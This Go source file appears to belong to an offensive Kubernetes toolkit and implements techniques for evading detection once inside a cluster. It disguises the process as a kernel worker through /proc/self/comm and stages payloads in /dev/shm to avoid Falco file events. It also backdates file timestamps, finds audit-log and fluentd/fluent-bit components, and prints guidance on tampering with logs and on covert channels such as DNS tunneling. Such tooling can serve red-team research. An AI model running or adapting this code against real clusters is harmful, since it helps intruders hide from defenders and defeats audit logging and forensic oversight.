package cloudevasion

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

// EvadeRuntimeDetection executes the specified runtime detection evasion technique.
func EvadeRuntimeDetection(ctx context.Context, client kubernetes.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "process_masquerade":
		return processMasquerade(ctx)
	case "fileless":
		return filelessExecution(ctx)
	case "log_tampering":
		return logTampering(ctx, client)
	case "timestomp":
		return timestomp(ctx)
	case "network_hide":
		return networkHide(ctx, client)
	default:
		return processMasquerade(ctx)
	}
}

func processMasquerade(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Process Masquerading:\n\n")

	targetName := "[kworker/0:1]"
	commPath := "/proc/self/comm"

	origComm, err := os.ReadFile(commPath)
	if err != nil {
		sb.WriteString("  /proc/self/comm not accessible (non-Linux or restricted)\n")
		sb.WriteString("  Falling back to argv[0] overwrite description\n")
		return &EvasionResult{
			Technique: "process_masquerade",
			Success:   false,
			Output:    sb.String(),
		}, nil
	}

	fmt.Fprintf(&sb, "  Original comm: %s", string(origComm))
	fmt.Fprintf(&sb, "  Target name: %s\n", targetName)

	err = os.WriteFile(commPath, []byte(targetName), 0)
	if err != nil {
		fmt.Fprintf(&sb, "  Write to comm failed: %v\n", err)
		return &EvasionResult{
			Technique: "process_masquerade",
			Success:   false,
			Output:    sb.String(),
		}, nil
	}

	newComm, _ := os.ReadFile(commPath)
	fmt.Fprintf(&sb, "  New comm: %s", string(newComm))
	sb.WriteString("  Process now appears as kernel worker thread in ps/top\n")

	_ = os.WriteFile(commPath, origComm, 0)

	return &EvasionResult{
		Technique: "process_masquerade",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func filelessExecution(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Fileless Execution:\n\n")

	shmPath := "/dev/shm/.kd_payload"
	payload := []byte("#!/bin/sh\necho kubedagger_fileless_exec\n")

	err := os.WriteFile(shmPath, payload, 0700)
	if err != nil {
		sb.WriteString("  /dev/shm not writable (non-Linux or noexec mount)\n")
		sb.WriteString("  Techniques available: memfd_create, /proc/self/mem injection\n")
		return &EvasionResult{
			Technique: "fileless",
			Success:   false,
			Output:    sb.String(),
		}, nil
	}

	fmt.Fprintf(&sb, "  Wrote payload to tmpfs: %s (%d bytes)\n", shmPath, len(payload))
	sb.WriteString("  tmpfs-backed — no disk write, no inode on physical storage\n")

	_ = os.Remove(shmPath)
	sb.WriteString("  Payload removed — only existed in RAM\n\n")
	sb.WriteString("  No file write events for Falco to trigger on\n")
	sb.WriteString("  No disk forensics artifacts\n")

	return &EvasionResult{
		Technique: "fileless",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func logTampering(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Log Tampering Techniques:\n\n")

	sb.WriteString("  1. K8s Audit Log Manipulation:\n")
	cms, err := client.CoreV1().ConfigMaps("kube-system").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cm := range cms.Items {
			if strings.Contains(cm.Name, "audit") {
				fmt.Fprintf(&sb, "     Found audit config: %s\n", cm.Name)
			}
		}
	}
	sb.WriteString("     - Modify audit policy to exclude our namespace/user\n")
	sb.WriteString("     - Set level: None for sensitive API paths\n\n")

	sb.WriteString("  2. Container Log Truncation:\n")
	sb.WriteString("     - Overwrite /var/log/containers/<our-pod>*.log\n")
	sb.WriteString("     - Truncate via hostPath volume mount\n")
	sb.WriteString("     - Redirect stdout/stderr to /dev/null\n\n")

	sb.WriteString("  3. Fluentd/Fluent-bit Manipulation:\n")

	logPods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		LabelSelector: "app=fluent-bit",
	})
	if err == nil && len(logPods.Items) > 0 {
		fmt.Fprintf(&sb, "     Found %d fluent-bit pods\n", len(logPods.Items))
	}

	logPods, err = client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		LabelSelector: "app=fluentd",
	})
	if err == nil && len(logPods.Items) > 0 {
		fmt.Fprintf(&sb, "     Found %d fluentd pods\n", len(logPods.Items))
	}

	sb.WriteString("     - Modify ConfigMap to add exclusion filter\n")
	sb.WriteString("     - Drop logs matching our pod/namespace pattern\n")

	return &EvasionResult{
		Technique: "log_tampering",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func timestomp(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Timestamp Manipulation:\n\n")

	refBinaries := []string{"/usr/bin/ls", "/bin/sh", "/usr/bin/cat"}
	var refTime time.Time
	var refPath string

	for _, bin := range refBinaries {
		info, err := os.Stat(bin)
		if err == nil {
			refTime = info.ModTime()
			refPath = bin
			break
		}
	}

	if refPath == "" {
		sb.WriteString("  No reference binary found (non-Linux environment)\n")
		return &EvasionResult{
			Technique: "timestomp",
			Success:   false,
			Output:    sb.String(),
		}, nil
	}

	fmt.Fprintf(&sb, "  Reference binary: %s (mtime: %s)\n", refPath, refTime.Format(time.RFC3339))

	targetPath := "/tmp/.kd_timestomp_test"
	err := os.WriteFile(targetPath, []byte("test"), 0600)
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot create test file: %v\n", err)
		return &EvasionResult{Technique: "timestomp", Success: false, Output: sb.String()}, nil
	}

	err = os.Chtimes(targetPath, refTime, refTime)
	if err != nil {
		fmt.Fprintf(&sb, "  Chtimes failed: %v\n", err)
		_ = os.Remove(targetPath)
		return &EvasionResult{Technique: "timestomp", Success: false, Output: sb.String()}, nil
	}

	info, _ := os.Stat(targetPath)
	fmt.Fprintf(&sb, "  Target file mtime after stomp: %s\n", info.ModTime().Format(time.RFC3339))
	sb.WriteString("  File now blends with system binaries in timeline analysis\n")

	_ = os.Remove(targetPath)

	return &EvasionResult{
		Technique: "timestomp",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func networkHide(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Network Activity Concealment:\n\n")

	netPolicies, err := client.NetworkingV1().NetworkPolicies("").List(ctx, metav1.ListOptions{})
	if err == nil {
		fmt.Fprintf(&sb, "  Existing NetworkPolicies: %d\n", len(netPolicies.Items))
		for _, np := range netPolicies.Items {
			fmt.Fprintf(&sb, "    %s/%s\n", np.Namespace, np.Name)
		}
		sb.WriteString("\n")
	}

	sb.WriteString("  Covert channel techniques:\n")
	sb.WriteString("    - DNS tunneling (UDP/53 typically allowed)\n")
	sb.WriteString("    - K8s API as transport (ConfigMap annotations)\n")
	sb.WriteString("    - Service mesh piggyback (mTLS prevents DPI)\n")
	sb.WriteString("    - ICMP payload encoding\n\n")
	sb.WriteString("  Detection blind spots:\n")
	sb.WriteString("    - NetworkPolicy only filters L3/L4, not content\n")
	sb.WriteString("    - K8s API traffic always allowed from pods\n")

	return &EvasionResult{
		Technique: "network_hide",
		Success:   true,
		Output:    sb.String(),
	}, nil
}
